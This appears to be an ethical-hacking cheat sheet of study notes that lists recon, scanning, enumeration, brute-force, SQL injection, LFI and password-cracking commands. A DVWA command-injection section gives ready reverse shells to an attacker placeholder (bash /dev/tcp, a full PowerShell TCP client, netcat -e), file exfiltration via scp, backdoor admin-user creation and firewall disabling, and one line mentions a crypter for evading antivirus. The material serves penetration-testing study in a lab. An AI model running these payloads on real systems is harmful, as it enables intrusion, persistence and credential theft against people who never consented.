#### Resources link

[Ethical hacking git](https://github.com/LibyKurian/ethicalhacking-h.git)

<details><summary><b> ⏬ Recon </b></summary>
  
  ##### via Web
  - [Tor Browser](https://www.torproject.org/download/)
  - [Google Search Engine](https://ahrefs.com/blog/google-advanced-search-operators/)
  - [Netcraft](https://searchdns.netcraft.com)
  - [Shodan](https://www.shodan.io/)
  - [Censys](https://censys.com/data-and-search/)

  ##### via application/tools
  - sublist3r `sublist3r -d domain -b all`
  - Harvester – `theharvester -d domain -n linkedin`
  - sherlock
  - userecon
  - photon
  - Web extractor
  - Httrack (for mirroring website)
  - Recon-ng
</details>

#### Network Scanning

- [Central Ops .net](https://centralops.net/co/)
- [OSINT framework](https://osintframework.com/)
- [NMAP cheatsheet](nmap.md) 🔗
- SX tool : command line network scanning tool that perform Arp scanning , TCP & UDP 
  ````bash
  sx arp 10.10.1.0/24
  sx arp 10.10.10.1 /24 –json | tee arp.cache      #for output in a file
  ````
- GUI application
  - Angry IP scanner : Perform host discovery any OS
  - Zenmap  - nmap’s  graphical interface tool
- uniscan
    Graphical:  Launch uniscan-gui and select required checkbox
    Command: `unicornscan 10.10.1.10 -Iv`
- Metasploit payloads(for scanning)
- some more tools
  ````bash
  #discover devices inside the network eth0
  netdiscover -i eth0
  #enumeration
  netstat -a 10.10.10.10      #netstat enumeration netbios
  snmp-check 10.10.10.10       #extract users from netbios - parrot
  masscan -e tun0 -p1-65535 -rate=1000 <ip> 
  ````

#### Default ports
| **Port**  | **Name**                          | **Insight (OS/Machine Identification Clues)** |
|----------|--------------------------------|----------------------------------------------|
| **22**   | SSH                            | Common on **Linux**, macOS, and network devices. |
| **23**   | Telnet                         | Found on **legacy systems** (old Windows, Unix). |
| **25**   | SMTP                           | Email servers, typically **Linux-based**. |
| **53**   | DNS                            | BIND service suggests **Linux**, Microsoft DNS hints at **Windows Server**. |
| **80**   | HTTP                           | Web servers (**Apache/Nginx on Linux, IIS on Windows**). |
| **443**  | HTTPS                          | Secure web servers, **IIS version suggests Windows Server**. |
| **3306** | MySQL                          | Mostly found on **Linux servers**. |
| **3389** | RDP (Remote Desktop)           | **Windows-only** (Windows Server, Windows 10/11). |
| **139**  | NetBIOS                        | **Windows-only** (Active Directory, Windows networking). |
| **445**  | SMB                            | **Windows-only** (file sharing, domain services). Used in **EternalBlue exploits**. |
| **21**   | FTP                            | Open source vs. proprietary FTP servers hint at OS. |
| **135**  | RPC                            | **Windows-only** (DCE-RPC for Active Directory, remote management). |
| **5060** | SIP                            | VoIP services, found on **Linux-based PBX servers** (Asterisk, FreePBX). |
| **161**  | SNMP                           | Found on **network devices** (Cisco routers, managed switches). |
| **8080** | Alternative HTTP               | Tomcat = **Linux**, IIS = **Windows**. |
| **4444** | Metasploit Listener            | Could indicate **reverse shell activity**. |
| **5432** | PostgreSQL                     | Database mostly found on **Linux servers**. |
| **5985** | WinRM (Windows Remote Management) | **Windows-only** (PowerShell Remoting, Windows Server). |
| **5555** | Android Debug Bridge (ADB)     | **Android devices** in debug mode, potential for remote exploitation. |


#### Enumeration
- If SMB (port 445) is open:
````bash
  #list shares:
    nmap --script smb-enum-shares -p 445 <IP>
    #Finds shared folders on a Windows/Linux machine.
    #If the target allows anonymous access, you'll see default shared folders (C$, IPC$, ADMIN$)
    smbclient -L //<TARGET-IP> -U anonymous -N
  #-N → No password prompt (used for anonymous access checks) & If listed, access it:
  smbclient //<TARGET-IP>/DVWA -U anonymous
  #Then, download the file:
  smb: \> get uploads/hash.txt
````
- enum4linux -U 10.10.60.11     #-U → users enumeration or try below
- crackmapexec smb <IP> --users
- If FTP (port 21) is open:
````bash
  ftp <TARGET-IP>
  #Try logging in with anonymous credentials:
  User: anonymous
  Password: (leave blank)
  
  ftp> ls
  #Navigate to DVWA/uploads/ and get the file:
  ftp> cd DVWA/uploads/
  ftp> get hash.txt
````
- smbmap
  ````
  smbmap -u "admin" -p "passowrd" -H 10.10.10.10 -x "ipconfig"
  -x = command
- bruteforcing
  ````
  hydra -L user.txt -P pass.txt smb://10.10.10.4
  L =  logging file name
  P = Passwords file name
  hydra -t4 -l lin -P /usr/share/wordlists/rockyou.txt ssh:10.10.149.11
  ````
- AD Explorer (LDAP)
  ````
  or with nmap
  nmap -p 389 –script=ldap-brute –script-args ldap.base=’”cn=users,dc=CEH,dc=com”’ 10.10.1.22
  ````
- some more:
  ````bash
  #dir enumeration
  gobuster dir -u 10.10.0.1 -w /usr/share/wordlists/common.txt -t 50 -x php,html,txt -q
  #dir : directory listing        #-u : host
  #-w : wordlists        #-t : threads int / Number of concurrent threads (default 10)
  #-x : enumerate hidden files htm, php      #-q : –quiet / Don’t print the banner and other noise
  
  #snmp-check 10.10.1.22
  snmp-check 10.10.1.22       #after UDP scan with nmap
  
  #wordpress enumeration
  wpscan --url https://localchost.com --passwords=
  wpscan -u 10.10.. -e u vp
  wpscan -u 10.10.. -e u --wordlist path/rockyou.txt        #bruteforce
  #-e : enumerate      #-u : enumerate usernames       #-vp : vulnerable plugins
  
  #wordlist generation
  cewl -w wordlist -d 2 -m 5 http://wordpress.com
  #-d = deeph of the scanning
  #-m = length of the words
  #-w = save to a file worlist
  ````

#### Vulnerability scanning
- openVAS | greenbone
- Tenable Nessus
- NIST
- CVE org (https://www.cve.org)
- nikto `nikto -h url -Cgidirs all`

#### Stegnography
- steghide
    ````bash
    steghide embed -ef abc -cf web.jpeg -sf new.jpeg -e none -p 123
    ef = embedded file      #abc is a text file in this example
    cf = cover file      #web.jpeg is a image file
    sf = stegno file      #new.jpeg is a stego created new file
    e = encryption
    p = password
    steghide extract -sf new.jpeg      #This will exctract the hidden file
    ````
- openstego GUI tool (https://github.com/syvaidya/openstego/releases)
- stegosuite
- SNOW
  ````js
  SNOW.EXE -C -p 1234 output.txt   // For extracting the hidden message
  
  // Options Available in SNOW
    -C Compress the data if concealing, or uncompress it while extracting.
    -Q Quiet mode, If not set means the application will report statistics such as compression percentage and amount of storage available.
    -S Report on the approximate amount of space available for a hidden message in the text file. Line length is taken into account, but other options are ignored.
    -p For setting the password for concealment of data and while extracting the data.
    -l line-len When appending whitespace, snow will always produce lines shorter than this value. By default, it is set to 80.
    -f Content of the file will get concealed in the input file.
    -m Message String The content written in this flag will be concealed into the input file.

  // Example
    Open the uncompressed file.
    Run the SNOW.exe file.
    Open CMD and reach the file that you want to hide the message within.
    Write the command like below for concealing the message into a text file:

      SNOW.EXE -C -p 1234 -m "hidden message" input.txt output.txt
      
      SNOW.EXE It tells the CMD window that we are using the snow tool for steganography.
      -C It is for compressing the data if concealing, or uncompressing it while extracting.
      -p It is for a password for concealing and extracting.
      input.txt The file in which you want to conceal the message within.
      output.txt The file in which you want the output.
  ````

#### Web explotation
##### SQL Injection  

<details><summary>Detect and Retrieving</summary>
  
- note that `-- ` is a comment indicator in mySQL or `--` `#` in oracle/MS/Pgres. This `'--` means that the rest of the query is interpreted as a comment, effectively removing it.  
- `condition'+OR+1=1--` in which, other then condition we input 1 is equal to 1. As 1=1 is always true, the query returns all items.   
- `' ORDER BY 1--` `' ORDER BY 2--`...until error or `' UNION SELECT NULL--` `' UNION SELECT NULL,NULL--` ...,is to get number of columns  
- [here more detailed comparison on queries of databases types](https://portswigger.net/web-security/sql-injection/cheat-sheet)
</details>
<details><summary>to determine the database version for some popular database types:</summary>
  
Microsoft, MySQL 	`SELECT @@version`  
Oracle 	`SELECT * FROM v$version`  
PostgreSQL 	`SELECT version()`  

For example, you could use a UNION attack with the following input:  
````sql
  ' UNION SELECT @@version--
````

</details>
<details><summary>Listing the contents of the database(except Oracle)</summary>

you can query information_schema.tables to list the tables in the database: 
````sql
  SELECT * FROM information_schema.tables
````
You can then query information_schema.columns to list the columns in individual tables:
````sql
  SELECT * FROM information_schema.columns WHERE table_name = 'Users'
````

</details>

<details><summary>Blind SQLi</summary>

In Cookies, If suppose we found users' as a table and administrator' as a username with multiple boolean conditions with burp repeater, then with intruder we can cluster bomb:  
````sql
  vz9' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§;
````
</details>


[SQLmap cheetsheet](sqlmap.md) 🔗
````js
// sql injection
sqlmap -u http://10.10.197.40/administrator.php --forms --dump

-u = url
--forms = grab the forms /detect
--dump = retrieve data form de sqli

#### basic sqli injection
sqlmap -u 10.10.77.169 --forms --dump

- u = url
- --forms= check the forms automatically
- --dump= dump dthe database data entries

// extract database
sqlmap -u http://localchost.com/hey.php?artist=1 --dbs
// extract colums
Sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artists --columns
// extract data of the table and the column inside of the db
sqlmap -u http://localchost.com/hey.php?artist=1 --D (tabla) --T artist --C adesc, aname, artist_id --dump
````
Local File Inclusion (LFI) Attack (If Web App is Vulnerable)
````html
  <!--If the website is vulnerable to LFI, try:-->
  http://<TARGET-IP>/vulnerable.php?file=../../DVWA/uploads/hash.txt
  <!--Or try Windows-style LFI:-->
  http://<TARGET-IP>/vulnerable.php?file=../../../../../../../../windows/system32/drivers/etc/hosts
  <!--If the app is filtering ../, use URL encoding:-->
  http://<TARGET-IP>/vulnerable.php?file=..%2F..%2FDVWA/uploads/hash.txt
````

<details><summary> ⏬ DVWA</summary>
  
Basic Commands
````bash
  ; whoami
  && whoami #If successful, it should return the current user (e.g., www-data in Linux).
````
List Files & Directories
````bash
  ; ls -la    #linux
  && dir    #windows
````
Read Files & user info (Sensitive Info)
````bash
  ; cat /etc/passwd    #linux
  ; cut -d: -f1 /etc/passwd      #View Only Usernames in above
  && type C:\Windows\System32\drivers\etc\hosts      #windows
  net user     #View All Users in windows
  query user    #View Active Logged-in Users
  net user /domain    #View Domain Users
````
Get the file:
- Try Accessing via a Web Browser (If DVWA Has File Access)
````js
  http://<TARGET-IP>/DVWA/uploads/hash.txt
  //If the file is accessible, you can download it directly // wget
````
- LFI via web [browser](#web-explotation)
- using [smb](#enumeration)
- using [ftp](#enumeration)
- Windows:
    If you have Command Injection or an RCE shell, use:
    ````bash
    type C:\DVWA\uploads\hash.txt    #CMD (Windows)
    Get-Content C:\DVWA\uploads\hash.txt     #powershell
    scp C:\DVWA\uploads\hash.txt attacker@<ATTACKER-IP>:/home/kali/     #To transfer the file to your system
    
    meterpreter > download C:\\DVWA\\uploads\\hash.txt .   #If you have Meterpreter, download the file
    ````
Check Network & Connections
````bash
  #Linux:
  ; ifconfig
  ; netstat -an
  #Windows:
  && ipconfig
  && netstat -an
````
Get a Reverse Shell (Full Access)
If outbound connections are allowed, you can get a reverse shell, with [netcat](#netcat-reverse-shell)
````bash
  #If nc is unavailable, try:
  ; bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1
  
  #Windows Reverse Shell, set up listener on Kali:
  nc -lvnp 4444
  #Then inject:
  && powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER-IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
````
Create a New User
If you have enough privileges, add a new user for persistent access.
````bash
  ; useradd -m hacker && echo "hacker:password" | chpasswd         #Linux
  
  #windows
  && net user hacker P@ssw0rd /add
  && net localgroup administrators hacker /add
````
Disable Firewalls
````bash
  ; iptables -F      #linux
  && netsh advfirewall set allprofiles state off       #windows
````
Metasploit (If You Have a Shell)
If you have Meterpreter access:
````bash
  meterpreter > getuid
  #List all users:
  meterpreter > run post/windows/gather/enum_users
  meterpreter > help
````
> How to Fix the Vulnerability?
  >> Sanitize input: Use escapeshellcmd() and escapeshellarg().

  >> Whitelist commands: Only allow specific inputs.

  >> Use prepared statements: Avoid direct execution of user input.
</details>

#### Netcat Reverse Shell
Attacker (Listener)
  ```
  nc -lvnp 4444
  ```
Victim (Windows/Linux)
  ```
  nc -e /bin/bash <ATTACKER-IP> 4444
  ```

#### Theef
  > Server exe need to be run on victim and client exe on Attacker

#### Payload detect via Anti-malware / Anti-Virus
- Virus Total
- Hybrid Analysis
- Antiscan.me
  
 > swazycrypter encryptes the application with more complexity/hash to avoid antivirus to find it.

#### Cryptography

Symmetric Encryption: Use same key for Encryption and decryption

Asymmetric Encryption: Use Public/Private for Encryption and Decryption

##### Hashing/decoding
To find the password of a ZIP file
````bash
  fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt <zipfile.zip>
  #-v → Verbose mode (show progress).
  #-u → Tries to unzip to verify correct password.
  #-D → Dictionary attack mode.
  #-p rockyou.txt → Uses RockYou wordlist (common passwords).
  #with john
    zip2john <zipfile.zip> > hash.txt        #First, extract the ZIP hash
    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt        #Then, crack it using rockyou.txt
    hashcat -m 13600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force        #OR use hashcat (mode 13600 for ZIP)
    john --show hash.txt      #To see the cracked password
  #If the ZIP uses weak encryption (pkzip format), you might be able to extract files without a password:
    unzip -P "" <zipfile.zip>
````
To decrypt (crack) a hashed password:
- Online:

| **Website** | **Supports (MD5, SHA1, NTLM, etc.)** | **Notes** |
|-------------|---------------------------------|-----------|
|[CrackStation](https://crackstation.net/) | MD5, SHA1, SHA256, SHA512, NTLM | Large precomputed database (rainbow tables) |
|[Hashes.com](https://hashes.com/) | MD5, SHA1, NTLM, MySQL, bcrypt | Free + premium cracking, community-driven |
|[OnlineHashCrack](https://www.onlinehashcrack.com/) | MD5, SHA1, NTLM, WPA, bcrypt | Supports **offline cracking** (upload files) |
|[MD5 Decrypt](https://md5decrypt.net/) | MD5, SHA1, NTLM, MySQL | Fast lookup for common hashes |
|[CMD5](https://www.cmd5.com/) | MD5, SHA1, SHA256, MySQL | Good for **NTLM & MySQL** hashes |

- Locally:
  - Identify the Hash Type
    ```
    hashid hash.txt
    hashcat --identify hash.txt
    ```
  - Crack the Hash
    ```
    // Using john (John the Ripper)
    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
    john --show hash.txt   // Check results
    
    // Using hashcat ( Find the correct hash mode (-m) )
    hashcat -m <HASH_MODE> -a 0 hash.txt /usr/share/wordlists/rockyou.txt
    hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt   // Example
    ```
  - Brute Force If No Dictionary Matches
    ```
    hashcat -m <HASH_MODE> -a 3 hash.txt ?a?a?a?a?a?a     // (Adjust ?a?a?a... for password length.)
    ```
  
  - Decode Base64 (If Encoded)
  If the file contains Base64-encoded text, decode it first:
    ```
    cat hash.txt | base64 -d
    ```
  If the hash is common (MD5, SHA1, NTLM), rockyou.txt is usually enough to crack it!

- GUI Applications
  - Hash Calc (window based tool)
  - MD5 Calculator (window based – git/sourceforage)
  - Cryptoforge
      - Not a free application
      - We can lock/encypt a file/folder with the password
  - Encrypt/Decrypt data with BCTTextEncoder
  
##### Disk Encryption
  - Bitlocker
  - Veracrypt (https://veracrypt.eu/en/Downloads.html)
    - after installing/opening application , create a volume
    - Choose an encrypted file container/ Non-system drive / entire drive
    - Select standard and location for this file
    - Choose encryption algorithm like AES
    - Allot size for the folder and choose password
    - Move the cursor for more complexity of encryption
    - Finish the setup
    - Now agin start the veracrypt application and select the output file and we can attach/mount it as a 'New Volumn'.


#### More
